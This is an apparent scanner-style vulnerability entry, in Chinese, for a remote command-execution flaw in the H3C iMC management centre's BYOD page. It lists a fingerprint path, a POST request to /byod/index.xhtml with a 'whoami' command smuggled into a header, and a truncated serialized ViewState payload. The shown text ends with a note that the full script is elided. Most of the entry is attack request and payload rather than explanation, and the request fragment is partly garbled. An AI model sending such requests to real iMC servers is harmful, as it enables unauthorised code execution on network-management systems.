# H3CiMC智能管理中心byodindex.xhtml命令执行漏洞

- **系统**：H3CiMC　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui"`
- **请求**：`POST /byod/index.xhtml HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`ID: 7822`　`Author: 匿名作者`　`Name: H3C iMC智能管理中心 远程代码执行漏洞`　`Description: H3C IMC（Intlligent Management Center）智能管理中心是H3C推出的下一代业务只能管理产品。它融合了当前多个产品，以统一风格提供与网络相关的各类管理、控制、监控等功能；同时以开放的组件化的架构原型，向平台及其承载业务提供分布式、分级式交互管理特性；并未业务软件的下一代产品提供最可靠的、可扩展、高性能的业务平台。H3C`

**请求体 / payload**
```
Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Via: whoami
javax.faces.ViewState=8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq%2b4sy0rUOuO
dM5ccd2J6LPx8c6%2b53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2
oU%2burahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm%2
bwbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chE
Og57teuLurMPrulbEVBAEl7rRwobqvxb91sG%2bGMrGWFL5%2bwFvE56x7UEzHtE/o0IRtzTKi
/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuro
r/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eo…（脚本共 10501 字，完整版见原文）
```
- **预期**：200　|　—